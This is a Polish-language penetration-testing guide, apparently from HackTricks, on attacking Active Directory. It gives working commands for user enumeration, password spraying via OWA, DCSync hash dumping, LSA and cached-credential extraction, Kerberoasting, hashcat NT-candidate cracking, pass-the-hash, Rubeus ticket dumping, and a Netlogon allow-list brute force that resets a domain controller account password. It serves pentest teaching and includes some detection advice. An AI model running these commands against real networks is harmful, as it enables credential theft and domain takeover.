# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** to podstawowa technologia umożliwiająca **administratorom sieci** wydajne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Została zaprojektowana z myślą o skalowaniu, ułatwiając organizowanie dużej liczby użytkowników w łatwe do zarządzania **grupy** i **podgrupy**, a także kontrolowanie **uprawnień dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech podstawowych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, współdzielących wspólną bazę danych. **Drzewa** to grupy tych domen połączonych wspólną strukturą, natomiast **las** reprezentuje zbiór wielu drzew połączonych poprzez **relacje zaufania**, tworząc najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określać konkretne **uprawnienia dostępu** i **komunikacji**.

Kluczowe pojęcia w **Active Directory** obejmują:

1. **Katalog** – przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – oznacza encje w katalogu, w tym **użytkowników**, **grupy** lub **foldery współdzielone**.
3. **Domena** – pełni funkcję kontenera dla obiektów katalogu; w obrębie **lasu** może współistnieć wiele domen, z których każda utrzymuje własny zbiór obiektów.
4. **Drzewo** – grupa domen współdzielących wspólną domenę główną.
5. **Las** – najwyższy poziom struktury organizacyjnej w Active Directory, złożony z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Usługi te obejmują:

1. **Domain Services** – centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – obsługuje aplikacje korzystające z katalogu za pośrednictwem **protokołu LDAP**.
4. **Directory Federation Services** – zapewnia funkcje **single sign-on**, umożliwiając uwierzytelnianie użytkowników w wielu aplikacjach webowych w ramach jednej sesji.
5. **Rights Management** – pomaga chronić materiały objęte prawami autorskimi poprzez regulowanie ich nieautoryzowanej dystrybucji i użycia.
6. **DNS Service** – ma kluczowe znaczenie dla rozwiązywania **nazw domen**.

Bardziej szczegółowe wyjaśnienie znajdziesz tutaj: [**TechTerms - definicja Active Directory**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby nauczyć się, jak **atakować AD**, musisz naprawdę dobrze **zrozumieć proces uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Ściągawka

Możesz przejść do [https://wadcoms.github.io/](https://wadcoms.github.io), aby szybko sprawdzić, jakie polecenia można uruchomić w celu enumeracji/exploitacji AD.

> [!WARNING]
> Komunikacja Kerberos zwykle **wymaga w pełni kwalifikowanej nazwy domeny (FQDN)**, aby klient mógł uzyskać ticket dla właściwego SPN. Uzyskiwanie dostępu do maszyny za pomocą adresu IP często powoduje przełączenie na NTLM zamiast Kerberos.

## Recon Active Directory (bez creds/sesji)

Jeśli masz dostęp do środowiska AD, ale nie posiadasz żadnych credentials/sesji, możesz:

- **Przeprowadzić Pentest sieci:**
- Przeskanować sieć, znaleźć maszyny i otwarte porty, a następnie spróbować **wykorzystać luki** lub **wyodrębnić credentials** z tych maszyn (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery webowe, drukarki, udziały, vpn, media itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zajrzyj do ogólnej [**metodologii Pentestingu**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby uzyskać więcej informacji na temat wykonywania tych czynności.
- **Sprawdź dostęp null i Guest w usługach smb** (nie zadziała to w nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik dotyczący enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik dotyczący enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruć sieć**
- Zbierać credentials poprzez [**podszywanie się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskać dostęp do hosta poprzez [**nadużycie relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbierać credentials poprzez **ujawnianie** [**fałszywych usług UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębniać nazwy użytkowników/imiona i nazwiska z wewnętrznych dokumentów, mediów społecznościowych i usług (głównie webowych) w środowiskach domenowych, a także z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz wypróbować różne **konwencje nazw użytkowników AD (**[**przeczytaj to**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery każdego członu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** Sprawdź strony dotyczące [**Pentestingu SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**Pentestingu LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy wysłane zostanie żądanie dotyczące **nieprawidłowej nazwy użytkownika**, serwer odpowie za pomocą kodu **błędu Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala określić, że nazwa użytkownika była nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** otrzymamy albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi przeprowadzić pre-authentication.
- **Brak uwierzytelniania względem MS-NRPC**: użycie auth-level = 1 (brak uwierzytelniania) względem interfejsu MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po powiązaniu z interfejsem MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje, bez użycia credentials. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Badanie można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Serwer OWA (Outlook Web Access)**

Jeśli znalazłeś jeden z tych serwerów w sieci, możesz również przeprowadzić **enumerację użytkowników**. Możesz na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listy nazw użytkowników można znaleźć w [**tym repozytorium github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym repozytorium ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak na etapie recon powinieneś mieć **nazwiska osób pracujących w firmie**, który powinieneś przeprowadzić wcześniej. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnie poprawnych nazw użytkowników.

### Nadużycie listy dozwolonych podatnych kanałów Netlogon (Onelogon)

Nawet po załataniu **Zerologon** na DC konta jawnie umieszczone na liście dozwolonych mogą nadal być narażone na **starsze/podatne zachowanie bezpiecznego kanału Netlogon**. Ryzykowną konfiguracją jest GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca mu wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zobacz [Security Descriptors](security-descriptors.md)). Każde konto lub grupa, której przyznano odpowiedni ACE w DACL, może być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza **Everyone** na liście dozwolonych.

Praktyczny workflow operatora:

1. **Zidentyfikuj podmioty znajdujące się na liście dozwolonych**, sprawdzając zarówno **SYSVOL/GPO**, jak i **aktywny rejestr DC**.
2. **Rozwiąż identyfikatory SID** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom komputerów DC**, **kontom relacji zaufania** oraz innym uprzywilejowanym komputerom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto znajdujące się na liście dozwolonych.
4. Po pomyślnym odgadnięciu nadużyj funkcji **ustawiania hasła Netlogon**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg znaków).<sup>[[9]](#references)[[10]](#references)</sup>

Szybkie przykłady triage / lab z publicznego artefaktu:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Uwagi:

- **Skaner** jest przydatny, ponieważ efektywna allow-list może znajdować się w **SYSVOL**, w **rejestrze** lub w obu tych miejscach.
- Sama ścieżka exploita jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera kontrolera domeny**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie tego hasła może bezpośrednio umożliwić szersze ścieżki **przejęcia AD**.
- **Wykonalność brute force** zależy od trybu: publiczny artefakt opisuje podejście meet-in-the-middle, **24-bitowy** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące detekcji / hardeningu:

- Przeprowadź audyt polityki allow-list i usuń wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami kompatybilności.
- Monitoruj zdarzenia **System** kontrolera domeny **5827/5828/5829/5830/5831**, aby wykrywać odrzucane, wykryte lub jawnie dozwolone przez politykę podatne połączenia Netlogon.
- Traktuj konta znajdujące się w `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od starszego rozwiązania nie zostanie usunięta.

### Znajomość jednej lub kilku nazw użytkowników

Załóżmy, że znasz już prawidłową nazwę użytkownika, ale nie masz haseł... Następnie spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać komunikatu AS_REP** dla tego użytkownika, który będzie zawierał dane zaszyfrowane przy użyciu pochodnej hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy użyć **najczęstszych haseł** dla każdego z odkrytych użytkowników; być może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
- Pamiętaj, że możesz również wykonać **spraying na serwerach OWA**, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### Zatruwanie LLMNR/NBT-NS

Możesz być w stanie **uzyskać** pewne **hashes** challenge, zatruwając niektóre protokoły **sieci**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracja Active Directory dostarcza nazw użytkowników, identyfikatorów e-mail i wzorców nazewnictwa, potencjalnych hostów oraz usług, które można nakłonić do uwierzytelnienia. Wykorzystaj te informacje do zidentyfikowania możliwych [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM oraz potencjalnych ścieżek do środowiska AD.

### Rozpoznanie NetExec oparte na workspace oraz sprawdzanie konfiguracji relay

- Używaj **workspace `nxcdb`**, aby zachować stan rozpoznania AD dla każdego engagementu: `workspace create <name>` tworzy osobne bazy danych SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm`, a zebrane sekrety wyświetlaj poleceniem `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **wersję kompilacji systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** oraz **Null Auth**. Hosty członkowskie oznaczone jako `(signing:False)` są **podatne na relay**, podczas gdy kontrolery domeny często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay do DC jest blokowany** przez signing, nadal sprawdzaj stan **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym SMB signingiem, ale wyłączonym LDAP signingiem, pozostaje użytecznym celem **relay-to-LDAP** dla ataków takich jak **SPN-less RBCD**.

### Wycieki poświadczeń z drukarek po stronie klienta → masowa walidacja poświadczeń domenowych

- Interfejsy drukarek/webowe UI czasami **osadzają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła/devtools może ujawnić cleartext (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów/wydruków.
- Pobrane zadania drukowania mogą zawierać **plaintext onboarding docs** z hasłami poszczególnych użytkowników. Podczas testowania zachowuj zgodność par:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskiwać dostęp do innych komputerów lub udziałów** przy użyciu **użytkownika null lub guest**, możesz **umieszczać pliki** (takie jak plik SCF), które po uzyskaniu dostępu w jakiś sposób **wyzwolą uwierzytelnianie NTLM przeciwko Tobie**, umożliwiając **kradzież** **wyzwania NTLM** w celu jego złamania:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy posiadany już hash NT jako kandydujące hasło dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force'ować długie passphrase w ticketach Kerberos RC4, wyzwaniach NetNTLM lub cached credentials, przekazujesz hashe NT do trybów NT-candidate Hashcat i pozwalasz mu sprawdzić ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po przejęciu domeny, gdy możesz zebrać tysiące aktualnych i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shucking, gdy:

- Masz zbiór NT z DCSync, zrzutów SAM/SECURITY lub vaultów poświadczeń i chcesz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwytujesz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania passphrase i natychmiast wykonać pivot za pomocą Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza wyłącznie AES, musisz wrócić do zwykłych trybów haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać największy możliwy zestaw hashy NT (wraz z ich poprzednimi wartościami):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii znacznie zwiększają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na zbieranie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowaj nazwę użytkownika/domeny, z której pochodzi każdy hash (nawet jeśli wordlista zawiera tylko wartości hex). Dopasowane hashe natychmiast pokażą, który principal ponownie używa hasła, gdy Hashcat wyświetli zwycięskiego kandydata.
- Preferuj kandydatów z tego samego lasu lub zaufanego lasu; maksymalizuje to szansę na nakładanie się danych podczas shucking.

#### Tryby NT-candidate Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- Dane wejściowe NT-candidate **muszą pozostać surowymi hashami NT o długości 32 znaków hex**. Wyłącz silniki reguł (bez `-r` i bez trybów hybrydowych), ponieważ modyfikowanie uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale keyspace NTLM (~30 000 MH/s na M3 Max) jest ~100× szybszy niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolniejszym formacie.
- Zawsze uruchamiaj **najnowszy build Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie istnieje tryb NT dla AS-REQ Pre-Auth, a typy AES (19600/19700) wymagają plaintextu hasła, ponieważ ich klucze są wyprowadzane przez PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Przykład – Kerberoast RC4 (tryb 35300)

1. Przechwyć ticket RC4 TGS dla docelowego SPN przy użyciu użytkownika z niskimi uprawnieniami (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Wykonaj shucking ticketa za pomocą listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego kandydata NT i sprawdza blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z posiadanych hashy NT.

3. Natychmiast wykonaj pivot za pomocą PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext za pomocą `hashcat -m 1000 <matched_hash> wordlists/`, jeśli będzie potrzebny.

#### Przykład – Cached credentials (tryb 31600)

1. Zrzuć cached logons z przejętej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dotyczącą interesującego użytkownika domeny do `dcc2_highpriv.txt` i wykonaj shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Pomyślne dopasowanie zwraca hash NT już znany na Twojej liście, potwierdzając, że użytkownik z cache ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) lub brute-force'uj go w szybkim trybie NTLM, aby odzyskać ciąg znaków.

Dokładnie ten sam workflow dotyczy odpowiedzi challenge-response NetNTLM (`-m 27000/27100`) oraz DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, PtH przez SMB/WMI/WinRM lub ponownie łamać hash NT offline za pomocą masek/reguł.



## Enumerating Active Directory WITH credentials/session

Na tym etapie musisz mieć **przejęte poświadczenia lub sesję prawidłowego konta domenowego**. Jeśli masz prawidłowe poświadczenia lub shell jako użytkownik domeny, **pamiętaj, że wcześniej przedstawione opcje nadal umożliwiają przejęcie innych użytkowników**.

Przed rozpoczęciem uwierzytelnionej enumeracji poznaj **problem podwójnego skoku Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracja

Przejęcie konta jest **ważnym krokiem w kierunku oceny domeny**, ponieważ umożliwia uwierzytelnioną **enumerację Active Directory**:

W odniesieniu do [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każdego potencjalnie podatnego użytkownika, a w odniesieniu do [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło przejętego konta, puste hasła oraz nowe obiecujące hasła.

- Możesz użyć [**CMD do wykonania podstawowego rekonesansu**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz również użyć [**powershell do rekonesansu**](../basic-powershell-for-pentesters/index.html), który będzie bardziej ukryty
- Możesz także [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md) do wyodrębnienia bardziej szczegółowych informacji
- Kolejnym świetnym narzędziem do rekonesansu w Active Directory jest [**BloodHound**](bloodhound.md). Jest **mało ukryty** (zależnie od używanych metod zbierania danych), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Znajdź, gdzie użytkownicy mogą korzystać z RDP, znajdź ścieżki do innych grup itd.
- **Inne automatyczne narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- **AdExplorer.exe** z pakietu **SysInternal** Suite to **narzędzie z GUI**, którego możesz użyć do enumeracji katalogu.
- Możesz również przeszukiwać bazę LDAP za pomocą **ldapsearch**, aby znaleźć poświadczenia w polach _userPassword_ i _unixUserPassword_, a nawet w polu _Description_. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli używasz **Linux**, możesz również enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz także wypróbować automatyczne narzędzia, takie jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

Uzyskanie wszystkich nazw użytkowników domeny z Windows jest bardzo łatwe (`net user /domain`, `Get-DomainUser` lub `wmic useraccount get name,sid`). W Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli ta sekcja Enumeracji wygląda na krótką, jest najważniejszą częścią całości. Otwórz odnośniki (głównie te dotyczące cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż poczujesz się swobodnie. Podczas oceny będzie to kluczowy moment, aby znaleźć drogę do DA lub stwierdzić, że nie da się nic zrobić.

### Kerberoast

Kerberoasting polega na uzyskaniu **ticketów TGS** używanych przez usługi powiązane z kontami użytkowników i złamaniu ich szyfrowania — opartego na hasłach użytkowników — **offline**.

Więcej informacji na ten temat:


{{#ref}}
kerberoast.md
{{#endref}}

### Zdalne połączenie (RDP, SSH, FTP, Win-RM itd.)

Po uzyskaniu pewnych poświadczeń możesz sprawdzić, czy masz dostęp do jakiejś **maszyny**. W tym celu możesz użyć **CrackMapExec** do próby połączenia z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Local Privilege Escalation

Jeśli przejąłeś poświadczenia lub sesję zwykłego użytkownika domeny i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj sposobu na **lokalne podniesienie uprawnień i zebranie poświadczeń**. Uprawnienia lokalnego administratora mogą umożliwić **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i pamięci lokalnej (SAM).

W tej książce znajduje się kompletna strona poświęcona [**local privilege escalation w Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Nie zapomnij również użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Jest **mało prawdopodobne**, że znajdziesz **tickety** bieżącego użytkownika, które **dają Ci uprawnienia dostępu** do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mając poświadczenia domenowe lub sesję użytkownika, ponownie rozważ [**ataki relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: uwierzytelnione techniki enumeracji i wymuszania uwierzytelnienia mogą ujawnić ścieżki relay, które były niedostępne podczas niezaufanego rozpoznania.

### Wyszukiwanie poświadczeń w udziałach komputerów | Udziały SMB

Teraz, gdy masz już podstawowe poświadczenia, powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w ramach AD**. Możesz zrobić to ręcznie, ale jest to bardzo nudne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby dowiedzieć się więcej o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (takie jak plik SCF), które po uzyskaniu do nich dostępu **wywołają uwierzytelnienie NTLM wobec Ciebie**, dzięki czemu będziesz mógł **ukraść** **challenge NTLM** i złamać je:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta luka umożliwiała każdemu uwierzytelnionemu użytkownikowi **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**W przypadku poniższych technik zwykły użytkownik domeny nie wystarczy — do przeprowadzenia tych ataków potrzebujesz specjalnych uprawnień/poświadczeń.**

### Ekstrakcja hashy

